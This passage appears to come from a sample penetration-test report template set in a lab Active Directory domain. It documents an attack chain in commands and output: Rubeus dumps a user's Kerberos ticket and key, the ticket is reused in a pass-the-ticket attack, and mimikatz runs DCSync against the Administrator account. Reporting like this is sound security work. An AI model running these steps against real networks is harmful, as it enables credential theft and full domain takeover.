{"text": "INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM | | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM | | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM Figure 11: Viewing Available Kerberos TIckets The tester then used this tool to retrieve the Kerberos TGT ticket for this user which could then be used to perform a \"pass-the-ticket\" attack and use the stolen TGT ticket to access resources in the domain. 13\\nPS C:\\> .\\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 Action: Dump Kerberos Ticket Data (All Users) [*] Target service : krbtgt [*] Target LUID : 0x1a8b19 [*] Current LUID : 0x256aef UserName : pramirez Domain : INLANEFREIGHT LogonId : 0x1a8b19 UserSID : S-1-5-21-1666128402-2659679066-1433032234-1108 AuthenticationPackage : Negotiate LogonType : RemoteInteractive LogonTime : 5/14/2022 8:21:35 AM LogonServer : DC01 LogonServerDNSDomain : INLANEFREIGHT.LOCAL UserPrincipalName : pramirez@INLANEFREIGHT.LOCAL ServiceName : krbtgt/INLANEFREIGHT.LOCAL ServiceRealm : INLANEFREIGHT.LOCAL UserName : pramirez UserRealm : INLANEFREIGHT.LOCAL StartTime : 5/15/2022 3:51:35 AM EndTime : 5/15/2022 1:51:35 PM RenewTill : 5/21/2022 8:21:35 AM Flags : name_canonicalize, pre_authent, initial, renewable, forwardable KeyType : aes256_cts_hmac_sha1 Base64(key) : 3g/++VoJZ4ipbExARBCKK960cN+3juTKNHiQ8XpHL/k= Base64EncodedTicket : doIFZDCCBWCgAwIBBaEDAgEWooIEVDCCBFBhgg<SNIP> ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.2 [*] Action: Import Ticket [+] Ticket successfully imported! Figure 12: Dumping Kerberos Ticket Data The tester performed the pass-the-ticket attack and successfully authenticated as the pramirez user. PS C:\\htb> .\\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP> Figure 13: Performing Pass-the-Ticket Attack This was confirmed using the klist command to view cached Kerberos tickets in the current session. 14\\nPS C:\\htb> klist Current LogonId is 0:0x256d1d Cached Tickets: (1) #0> Client: pramirez @ INLANEFREIGHT.LOCAL Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize Start Time: 5/15/2022 3:51:35 (local) End Time: 5/15/2022 13:51:35 (local) Renew Time: 5/21/2022 8:21:35 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0x1 -> PRIMARY Kdc Called: Figure 14: Listing Kerberos Tickets in Session The tester then utilized this access to perform a DCSync attack and retrieve the NTLM password hash for the built-in Administrator account which led to Enterprise Admin level access over the domain. PS C:\\htb> .\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\administrator [DC] 'INLANEFREIGHT.LOCAL' will be the domain [DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server [DC] 'INLANEFREIGHT\\administrator' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9)", "metadata": {"doc_id": "Hack the Box - sample-penetration-testing-report-template", "chunk_id": 7}}